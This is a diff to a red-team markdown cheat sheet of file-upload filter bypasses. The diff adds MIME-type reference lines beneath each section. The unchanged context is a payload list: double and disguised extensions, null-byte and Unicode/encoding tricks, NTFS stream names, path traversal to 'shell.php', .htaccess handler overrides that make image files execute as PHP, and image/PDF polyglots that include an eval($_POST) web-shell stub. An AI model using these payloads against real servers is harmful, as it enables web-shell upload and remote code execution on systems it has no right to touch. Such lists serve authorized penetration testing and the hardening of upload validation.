@@ -1,4 +1,4 @@
-# 🛡 Ultimate File Upload Bypass – Optimized Edition
+# 🛡 Ultimate File Upload Bypass – Optimized Edition + MIME-Type Reference
 _By CybrX1337 – Red Team Focus_
 
 ⚠ **Educational / Authorized Testing Only**
@@ -46,6 +46,7 @@ _By CybrX1337 – Red Team Focus_
 .jsp  
 .jsf  
 .shtm  
+**MIME-Type Related:** application/x-httpd-php, text/x-php, application/php, text/html, application/x-aspx, text/x-server-parsed-html, application/x-httpd-cfm, application/java-server-pages
 
 ---
 
@@ -55,6 +56,7 @@ _By CybrX1337 – Red Team Focus_
 .PHTML  
 .pһp  # Cyrillic һ  
 .phρ   # Greek rho  
+**MIME-Type Related:** application/x-httpd-php, text/x-php, application/x-php
 
 ---
 
@@ -64,6 +66,7 @@ file.php%00.png
 file.php%0a  
 file.php%09  
 file.php%20  
+**MIME-Type Related:** application/x-httpd-php, image/png, image/jpeg, text/plain
 
 ---
 
@@ -73,6 +76,7 @@ file.jpg.php
 file.png.php  
 file.gif.php  
 file.php.jpg%00.png  
+**MIME-Type Related:** application/x-httpd-php, image/jpeg, image/png, image/gif
 
 ---
 
@@ -82,6 +86,7 @@ file.php%23.jpg
 file.php;jpg  
 file.php;.jpg  
 file.php::$DATA  
+**MIME-Type Related:** application/x-httpd-php, image/jpeg, text/plain
 
 ---
 
@@ -91,6 +96,7 @@ file.php::$DATA
 ..%5c..%5cshell.php  
 %2e%2e%2f%2e%2e%2fshell.php  
 shell.php/..  
+**MIME-Type Related:** application/x-httpd-php, text/plain
 
 ---
 
@@ -99,7 +105,8 @@ file%2Ephp
 file%252Ephp  
 file.p%68p  
 file.p\u0068p  
-file.php%2Ejpg  
+file.php%2E.jpg  
+**MIME-Type Related:** application/x-httpd-php, image/jpeg
 
 ---
 
@@ -109,6 +116,7 @@ shell.php%00.jpg
 shell.php%20.jpg  
 shell.php;jpg  
 shell.php..jpg  
+**MIME-Type Related:** application/x-httpd-php, image/jpeg
 
 ---
 
@@ -118,6 +126,7 @@ shell.php..jpg
 .phar  
 .suspected  
 .module  
+**MIME-Type Related:** application/x-httpd-php, application/x-php
 
 ---
 
@@ -127,6 +136,7 @@ AddType application/x-httpd-php .jpg
 AddHandler application/x-httpd-php .gif  
 AddType application/x-httpd-php .png  
 AddHandler application/x-httpd-php .txt  
+**MIME-Type Related:** text/plain, application/x-httpd-php
 
 ---
 
@@ -136,6 +146,7 @@ FFD8FF...<?php echo "JPEG+PHP"; ?>
 PNG....IEND<?php phpinfo(); ?>  
 PDF%0A<?php eval($_POST[1]); ?>  
 <?php echo 'EXIF Injection'; ?>  
+**MIME-Type Related:** image/gif, image/jpeg, image/png, application/pdf, application/x-httpd-php
 
 ---
 
@@ -145,6 +156,7 @@ Content-Type: text/plain
 Content-Type: image/jpeg  
 Content-Type: image/png  
 Content-Type: application/octet-stream  
+**MIME-Type Related:** application/x-httpd-php, text/plain, image/jpeg, image/png, application/octet-stream
 
 ---
 
@@ -154,6 +166,7 @@ shell.php.tar
 shell.php.tar.gz  
 shell.php.rar  
 shell.php.gz  
+**MIME-Type Related:** application/zip, application/x-tar, application/gzip, application/x-rar-compressed
 
 ---
 
@@ -163,6 +176,7 @@ shell.php.fr
 shell.php.txt.en  
 shell.php.plain.en  
 shell.php.de  
+**MIME-Type Related:** application/x-httpd-php, text/plain
 
 ---
 
@@ -172,6 +186,7 @@ shell.php::$DATA
 shell.php::$INDEX_ALLOCATION  
 shell.aspx::$DATA  
 shell.asp::$INDEX_ALLOCATION  
+**MIME-Type Related:** application/x-httpd-php, application/x-aspx
 
 ---
 
@@ -181,6 +196,7 @@ SVG with embedded `<script>` executing PHP
 SVG with Base64-encoded PHP in `<image xlink:href>`  
 SVG + JPEG polyglot with PHP footer  
 SVG with external entity injection calling PHP  
+**MIME-Type Related:** image/svg+xml, image/jpeg, application/x-httpd-php
 
 ---
 
@@ -190,6 +206,7 @@ Content-Disposition: form-data; filename="shell.php" name="file
 Missing Content-Type header  
 Duplicate Content-Type header with different MIME  
 MIME header split using CRLF injection  
+**MIME-Type Related:** application/x-httpd-php, text/plain, image/jpeg, image/png
 
 ---
 
@@ -199,6 +216,7 @@ filename="shell.jpg" filename="shell.php"
 filename*="UTF-8''shell.php"  
 filename="shell.php?abc=1"  
 filename="shell.php%00.jpg"  
+**MIME-Type Related:** application/x-httpd-php, image/jpeg
 
 ---
 
@@ -208,6 +226,7 @@ Chunked request with early terminating chunk
 MIME headers split between chunks  
 PHP payload obfuscated with chunk boundaries  
 Overlapping chunk sizes causing parser confusion  
+**MIME-Type Related:** application/x-httpd-php
 
 ---
 
@@ -217,3 +236,4 @@ file.php%E2%80%AD.jpg
 file%u002Ephp  
 file%u2215php  
 file%u2024php  
+**MIME-Type Related:** application/x-httpd-php, image/jpeg
